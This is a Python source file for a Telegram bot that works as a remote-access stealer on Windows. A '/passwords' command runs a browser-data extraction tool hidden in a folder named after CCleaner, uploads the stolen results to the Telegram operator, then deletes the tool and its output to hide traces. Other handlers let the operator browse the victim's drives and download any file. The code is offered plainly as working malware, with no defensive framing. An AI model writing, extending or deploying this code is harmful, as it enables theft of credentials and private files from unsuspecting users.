from utils import reply_builder
from aiogram.types import Message
from aiogram.filters.command import Command
import os
from aiogram import types, Router
import subprocess
import ctypes
import shutil


direction = "C:/"

router = Router()


@router.message(Command("passwords"))
async def send(message: Message):
    exe_path = f'C:/CCleanerPlus/hack-browser-data.exe'
    subprocess.run([exe_path])
    for name in os.listdir("C:/CCleanerPlus/results"):
        docs = types.FSInputFile(f"C:/CCleanerPlus/results/{name}")
        await message.reply_document(docs)
    shutil.rmtree("C:/CCleanerPlus/results")
    os.remove("C:/CCleanerPlus/hack-browser-data.exe")


@router.message(Command("start"))
async def start(message: Message):
    try:
        folders = [
                      f"📁|{i}" if os.path.isdir(os.path.join(direction, i)) else f"🖼|{i}"
                      for i in os.listdir(direction)
                  ] + ["BACK❌❌"]
        await message.reply("Select folder:", reply_markup=reply_builder(folders))
    except Exception as e:
        await message.reply(f"An error occurred. Please try again.{e}")


@router.message()
async def folder(message: Message):
    global direction
    try:
        print(ctypes.windll.shell32.IsUserAnAdmin())
        if message.text == "BACK❌❌":
            direction = os.path.abspath(os.path.join(direction, "../"))

        else:
            new_direction = os.path.join(direction, message.text.split("|")[1])
            if os.path.isdir(new_direction):
                os.path.isdir(new_direction)
                direction = new_direction
            else:
                photo = types.FSInputFile(new_direction)
                await message.reply_document(photo)
        await start(message)

    except Exception as e:
        await message.reply(f"An error occurred. Please try again.\n {e}")


